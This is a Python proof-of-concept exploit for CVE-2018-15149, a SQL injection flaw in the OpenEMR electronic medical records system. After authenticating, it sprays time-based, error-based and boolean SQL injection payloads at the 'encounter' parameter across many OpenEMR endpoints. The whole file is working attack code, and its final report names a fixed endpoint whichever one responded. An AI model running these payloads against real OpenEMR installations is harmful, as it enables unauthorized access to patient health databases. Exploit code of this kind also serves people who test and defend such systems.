#!/usr/bin/env python3
"""
CVE-2018-15149 - OpenEMR SQL Injection PoC
Vulnerability: SQL Injection in encounter parameter
Affected: OpenEMR < 5.0.1.4
Location: interface/forms/eye_mag/php/Anything_simple.php
          via getProviderIdOfEncounter() in library/forms.inc

This PoC confirms the vulnerability using time-based blind SQL injection.
"""

import argparse
import sys
import time
import requests
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()


def authenticate(session, target, user, password, site):
    """Authenticate to OpenEMR and establish session."""
    login_url = urljoin(target, f"/interface/main/main_screen.php?auth=login&site={site}")

    login_data = {
        "new_login_session_management": "1",
        "authProvider": "Default",
        "authUser": user,
        "clearPass": password,
        "languageChoice": "1"
    }

    try:
        resp = session.post(login_url, data=login_data, verify=False, timeout=30, allow_redirects=True)

        if resp.status_code == 200 and "login" not in resp.url.lower():
            if "Invalid" not in resp.text and "denied" not in resp.text:
                return True

        alt_login = urljoin(target, "/interface/login/login.php?site=" + site)
        resp = session.get(alt_login, verify=False, timeout=10)

        resp = session.post(login_url, data=login_data, verify=False, timeout=30, allow_redirects=True)
        if "Invalid" not in resp.text and "denied" not in resp.text:
            cookies = session.cookies.get_dict()
            if any("PHPSESSID" in k or "OpenEMR" in k for k in cookies.keys()) or len(cookies) > 0:
                return True

    except requests.RequestException as e:
        print(f"[!] Authentication request failed: {e}", file=sys.stderr)
        return False

    return False


def setup_encounter_context(session, target):
    """Set up patient and encounter context for the vulnerable endpoints."""
    try:
        # Set active patient
        session.get(
            urljoin(target, "/interface/patient_file/summary/demographics.php"),
            params={"set_pid": "1"},
            verify=False,
            timeout=10
        )
        
        # Try to set/create an encounter context
        session.get(
            urljoin(target, "/interface/patient_file/encounter/encounter_top.php"),
            params={"set_encounter": "1", "pid": "1"},
            verify=False,
            timeout=10
        )
        
        # Also try forms.php to load encounter context
        session.get(
            urljoin(target, "/interface/patient_file/encounter/forms.php"),
            params={"pid": "1", "encounter": "1"},
            verify=False,
            timeout=10
        )
    except:
        pass
    return True


def test_sqli(session, target, site, delay=3):
    """
    Test SQL injection using time-based blind technique.
    Uses SLEEP() to confirm injection is working.
    Returns (confirmed, payload, elapsed_time)
    """
    # Try multiple vulnerable endpoints - eye_mag and other encounter-based forms
    vuln_endpoints = [
        "/interface/forms/eye_mag/php/Anything_simple.php",
        "/interface/forms/eye_mag/save.php",
        "/interface/forms/eye_mag/taskman.php",
        "/interface/patient_file/encounter/forms.php",
        "/interface/patient_file/encounter/load_form.php",
        "/interface/patient_file/encounter/delete_form.php",
        "/interface/patient_file/encounter/encounter_top.php",
        "/interface/patient_file/encounter/superbill_codes.php",
        "/interface/forms/vitals/C_FormVitals.class.php",
        "/interface/forms/newpatient/common.php",
    ]

    # Add AJAX header for Anything_simple.php
    ajax_headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Actions that may trigger getProviderIdOfEncounter()
    actions = [
        "retrieve",
        "get_PRIOR",
        "get_PMSFH",
        "get_HPI",
        "PRIORS_query",
    ]

    payloads = [
        f"1 AND (SELECT SLEEP({delay}))-- -",
        f"1-SLEEP({delay})",
        f"IF(1=1,SLEEP({delay}),0)",
        f"1*0+SLEEP({delay})",
        f"(SELECT 1 FROM (SELECT SLEEP({delay}))x)",
        f"0 OR SLEEP({delay})",
        f"1;SELECT SLEEP({delay})",
        f"1' AND SLEEP({delay})-- -",
        f"1' AND (SELECT SLEEP({delay}))-- -",
        f"1' AND SLEEP({delay})#",
    ]

    baseline_time = 0

    print(f"[*] Testing time-based SQL injection with {delay}s delay...")

    # Set up patient and encounter context
    setup_encounter_context(session, target)

    # Try the primary vulnerable endpoint with proper AJAX POST request first
    primary_url = urljoin(target, "/interface/forms/eye_mag/php/Anything_simple.php")
    
    # The vulnerable function getProviderIdOfEncounter is called via AJAX
    for action in ["get_PRIOR", "retrieve", "get_allMissing"]:
        for payload in payloads:
            post_data = {
                "action": action,
                "encounter": payload,
                "pid": "1",
                "form_id": "1",
                "id": "1"
            }
            
            try:
                start_time = time.time()
                session.post(
                    primary_url,
                    data=post_data, 
                    headers=ajax_headers,
                    verify=False, 
                    timeout=delay + 15
                )
                elapsed = time.time() - start_time
                
                # Check if response was delayed indicating SLEEP worked
                if elapsed >= delay - 0.5:
                    print(f"[+] SQLi CONFIRMED! Response delayed by {elapsed:.2f}s")
                    print(f"[+] Payload: {payload}")
                    print(f"[+] Endpoint: /interface/forms/eye_mag/php/Anything_simple.php")
                    print(f"[+] Parameter: encounter")
                    return True, payload, elapsed
                    
            except requests.Timeout:
                print(f"[+] SQLi CONFIRMED! Request timed out (delay worked)")
                return True, payload, delay
            except requests.RequestException:
                continue

    # Measure baseline response time
    try:
        baseline_url = urljoin(target, "/interface/main/tabs/main.php")
        start = time.time()
        session.get(baseline_url, verify=False, timeout=10)
        baseline_time = time.time() - start
        print(f"[*] Baseline response time: {baseline_time:.2f}s")
    except:
        baseline_time = 0.5

    # Test each endpoint with each payload via GET
    for endpoint in vuln_endpoints:
        vuln_url = urljoin(target, endpoint)
        
        # Check if endpoint exists first
        endpoint_baseline = baseline_time
        try:
            start = time.time()
            check = session.get(vuln_url, params={"encounter": "1", "pid": "1"}, verify=False, timeout=10)
            if check.status_code == 404:
                continue  
        except:
            continue
            
        for payload in payloads:
            params = {"encounter": payload, "pid": "1"}

            try:
                start_time = time.time()
                resp = session.get(vuln_url, params=params, verify=False, timeout=delay + 15)
                elapsed = time.time() - start_time

                # Compare against baseline + delay threshold
                if elapsed >= delay - 0.5:
                    print(f"[+] SQLi CONFIRMED! Response delayed by {elapsed:.2f}s")
                    print(f"[+] Payload: {payload}")
                    print(f"[+] Endpoint: {endpoint}")
                    return True, payload, elapsed

            except requests.Timeout:
                print(f"[+] SQLi CONFIRMED! Request timed out (delay worked)")
                print(f"[+] Endpoint: {endpoint}")
                return True, payload, delay
            except requests.RequestException as e:
                print(f"[-] Request error: {e}", file=sys.stderr)
                continue

    # Try POST method as some endpoints require it
    for endpoint in vuln_endpoints:
        if endpoint == "/interface/forms/eye_mag/php/Anything_simple.php":
            continue  # Already tested above with proper AJAX
            
        vuln_url = urljoin(target, endpoint)
        
        for payload in payloads:
            data = {"encounter": payload, "pid": "1", "formdir": "vitals", "formid": "1"}

            try:
                # Re-setup context
                setup_encounter_context(session, target)
                
                start_time = time.time()
                resp = session.post(
                    vuln_url, data=data, headers=ajax_headers,
                    verify=False, timeout=delay + 15
                )
                resp.text  # Force read
                elapsed = time.time() - start_time

                if elapsed >= delay - 0.5 and elapsed > baseline_time + delay - 1.0:
                    print(f"[+] SQLi CONFIRMED (POST)! Response delayed by {elapsed:.2f}s")
                    print(f"[+] Payload: {payload}")
                    return True, payload, elapsed
            except requests.Timeout:
                print(f"[+] SQLi CONFIRMED! Request timed out (delay worked)")
                return True, payload, delay
            except requests.RequestException as e:
                print(f"[-] Request error with payload: {e}", file=sys.stderr)
                continue
    
    # Try error-based SQL injection as fallback
    error_payloads = [
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
        "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
        "1'",
    ]
    
    print("[*] Trying error-based SQL injection...")
    for endpoint in vuln_endpoints:
        url = urljoin(target, endpoint)
        for payload in error_payloads:
            params = {"encounter": payload, "pid": "1"}

            try:
                start_time = time.time()
                resp = session.get(url, params=params, verify=False, timeout=15)
                
                # Check for SQL error indicators
                error_indicators = [
                    "SQL syntax",
                    "mysql_",
                    "mysqli_",
                    "SQLSTATE",
                    "syntax error",
                    "Query failed",
                    "Unclosed quotation",
                    "You have an error in your SQL",
                    "Warning:",
                ]
                
                if any(indicator in resp.text for indicator in error_indicators):
                    print(f"[+] SQLi CONFIRMED via error-based detection!")
                    print(f"[+] Endpoint: {endpoint}")
                    return True, payload, 0
                    
                elapsed = time.time() - start_time

                if elapsed >= delay - 0.5:
                    print(f"[+] SQLi CONFIRMED on {endpoint}!")
                    print(f"[+] Response delayed by {elapsed:.2f}s")
                    return True, payload, elapsed
            except requests.Timeout:
                print(f"[+] SQLi CONFIRMED on {endpoint}! (timeout)")
                return True, payload, delay
            except:
                continue

    # Try stacked queries and boolean-based on library/forms.inc directly
    print("[*] Trying alternative injection points...")
    
    alt_endpoints = [
        "/interface/forms/LBF/new.php",
        "/interface/forms/LBF/view.php", 
        "/interface/forms/procedure_order/new.php",
        "/interface/patient_file/summary/pnotes_full.php",
    ]
    
    boolean_payloads = [
        "1 AND 1=1",
        "1 AND 1=2",
        f"1 AND BENCHMARK(5000000,MD5('test'))",
    ]
    
    for endpoint in alt_endpoints:
        url = urljoin(target, endpoint)
        
        try:
            # Get baseline
            start = time.time()
            resp1 = session.get(url, params={"encounter": "1 AND 1=1", "pid": "1"}, verify=False, timeout=10)
            time1 = time.time() - start
            
            start = time.time()
            resp2 = session.get(url, params={"encounter": "1 AND 1=2", "pid": "1"}, verify=False, timeout=10)
            time2 = time.time() - start
            
            # Check for boolean-based difference
            if len(resp1.text) != len(resp2.text) and abs(len(resp1.text) - len(resp2.text)) > 10:
                print(f"[+] Boolean-based SQLi detected on {endpoint}!")
                print(f"[+] Response length difference: {abs(len(resp1.text) - len(resp2.text))} bytes")
                return True, "1 AND 1=1 vs 1 AND 1=2", 0
                
        except:
            continue

    return False, None, 0


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2018-15149 - OpenEMR SQL Injection PoC"
    )
    parser.add_argument("-t", "--target", default="http://localhost:8080", help="Target OpenEMR URL (e.g., http://localhost:8080)")
    parser.add_argument("-u", "--user", default="admin", help="OpenEMR username")
    parser.add_argument("-P", "--password", default="pass", help="OpenEMR password")
    parser.add_argument("--site", default="default", help="OpenEMR site ID")
    parser.add_argument("-f", "--probe-file", default="/etc/passwd", help="File to read (not used for SQLi, kept for interface compatibility)")
    parser.add_argument("-d", "--delay", type=int, default=3, help="SLEEP delay in seconds for time-based detection")

    args = parser.parse_args()

    target = args.target.rstrip("/")

    print(f"[*] CVE-2018-15149 - OpenEMR SQL Injection PoC")
    print(f"[*] Target: {target}")
    print(f"[*] User: {args.user}")
    print(f"[*] Site: {args.site}")
    print()

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })

    print("[*] Authenticating...")
    if not authenticate(session, target, args.user, args.password, args.site):
        print("[-] Authentication failed!", file=sys.stderr)
        print("[-] Check credentials and target URL", file=sys.stderr)
        sys.exit(3)

    print("[+] Authentication successful")
    print()

    confirmed, payload, elapsed = test_sqli(session, target, args.site, args.delay)

    if confirmed:
        print()
        print("=" * 60)
        print("[+] VULNERABILITY CONFIRMED: CVE-2018-15149")
        print(f"[+] Target is vulnerable to SQL injection")
        print(f"[+] Endpoint: /interface/forms/eye_mag/php/Anything_simple.php")
        print(f"[+] Parameter: encounter")
        print("=" * 60)
        sys.exit(0)
    else:
        print()
        print("[-] Could not confirm SQL injection")
        print("[-] Target may be patched or endpoint not accessible")
        sys.exit(2)


if __name__ == "__main__":
    main()
